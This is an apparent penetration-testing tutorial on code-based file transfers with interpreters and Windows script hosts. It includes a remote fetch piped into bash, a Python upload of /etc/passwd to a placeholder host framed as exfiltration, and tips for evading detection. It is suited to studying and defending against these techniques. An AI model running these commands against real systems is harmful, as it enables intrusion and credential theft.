
# Transferring Files with Code

## Why This Matters

On many targets:

* `wget`, `curl`, PowerShell, or certutil may be **blocked**
* Firewalls may restrict ports
* AV/EDR may flag common tools

But **programming languages are often trusted** and already installed.

That’s why attackers (and red teamers) use **code-based file transfers**:

* Harder to detect
* Flexible
* Can be fileless
* Works across OSes

---

## Commonly Available Languages

You’ll most often encounter:

* **Python** (Linux, sometimes Windows)
* **PHP** (especially on web servers)
* **Perl**
* **Ruby**
* **JavaScript / VBScript** (Windows)
* Sometimes **Node.js**

Each can:

* Download files
* Upload files
* Execute payloads directly in memory

---

# Python File Transfers

Python is one of the **most reliable fallback tools**.

### Why attackers love Python

* Installed by default on most Linux systems
* One-liners supported
* Powerful networking libraries

---

## Python Download Examples

### Python 2.7

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("URL", "file")'
```

### Python 3

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("URL", "file")'
```

### Use cases

* `wget` / `curl` unavailable
* Restricted shell
* Custom scripts

---

# PHP File Transfers

PHP is **extremely common** on web servers.

### Key advantage

If you have:

* A web shell
* RCE in a PHP app

You already have a file transfer tool.

---

## PHP Download Methods

### file_get_contents + file_put_contents

```bash
php -r '$f=file_get_contents("URL"); file_put_contents("file",$f);'
```

### fopen (streaming)

Useful for large files:

```bash
php -r '
$fremote=fopen("URL","rb");
$flocal=fopen("file","wb");
while($buf=fread($fremote,1024)){fwrite($flocal,$buf);}
fclose($flocal); fclose($fremote);'
```

---

## PHP Fileless Execution

```bash
php -r 'foreach(@file("URL") as $l){echo $l;}' | bash
```

✔ No file written
✔ Very stealthy
✘ Still visible in process + network logs

---

# Ruby and Perl

Less common today, but still found on servers.

### Ruby Download

```bash
ruby -e 'require "net/http";
File.write("file", Net::HTTP.get(URI("URL")))'
```

### Perl Download

```bash
perl -e 'use LWP::Simple; getstore("URL","file");'
```

### When to use

* Legacy systems
* Hardened environments
* Tool diversity to evade detection

---

# JavaScript (Windows)

Windows supports JavaScript execution via:

* `cscript.exe`
* `wscript.exe`
* `mshta.exe`

This is classic **LOLBins abuse**.

---

## JavaScript Download (cscript)

### JavaScript Code (`wget.js`)

```javascript
var req = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
req.Open("GET", WScript.Arguments(0), false);
req.Send();

var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(req.ResponseBody);
stream.SaveToFile(WScript.Arguments(1));
```

### Execute

```cmd
cscript.exe /nologo wget.js URL output.ps1
```

✔ No PowerShell
✔ Often allowed by policy
✘ Logged if script execution is monitored

---

# VBScript (Windows)

VBScript has been present in Windows **since Windows 98**.

### VBScript Download (`wget.vbs`)

```vbscript
Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStrm = CreateObject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments(0), False
xHttp.Send

bStrm.Type = 1
bStrm.Open
bStrm.Write xHttp.responseBody
bStrm.SaveToFile WScript.Arguments(1), 2
```

### Execute

```cmd
cscript.exe /nologo wget.vbs URL file.ps1
```

✔ Works without PowerShell
✔ Very stealthy on older systems

---

# Upload Operations with Code

Downloading is only half the story.
Uploading is critical for:

* Credential exfiltration
* Packet captures
* Database dumps
* Evidence collection

---

## Python Upload (HTTP POST)

### Start Upload Server

```bash
python3 -m uploadserver
```

---

### Python One-liner Upload

```bash
python3 -c 'import requests;
requests.post("http://IP:8000/upload",
files={"files":open("/etc/passwd","rb")})'
```

---

### Breakdown (important for understanding)

```python
import requests
url = "http://IP:8000/upload"
file = open("/etc/passwd","rb")
requests.post(url, files={"files": file})
```

✔ Simple
✔ Reliable
✔ Works on Linux & Windows

---

# Key Takeaways

### Why attackers use code-based transfers

* Tools may be blocked
* Languages are trusted
* Easier to customize
* Supports fileless execution

### What defenders should watch

* Interpreters spawning shells
* One-liners with `-c`, `-r`, `-e`
* Suspicious HTTP requests
* Script engines like `cscript.exe`

---

## Final Recap

If you remember nothing else, remember this:

> **If code can run, files can move.**

File transfers don’t require:

* FTP
* SMB
* wget
* curl

They only require **execution**.
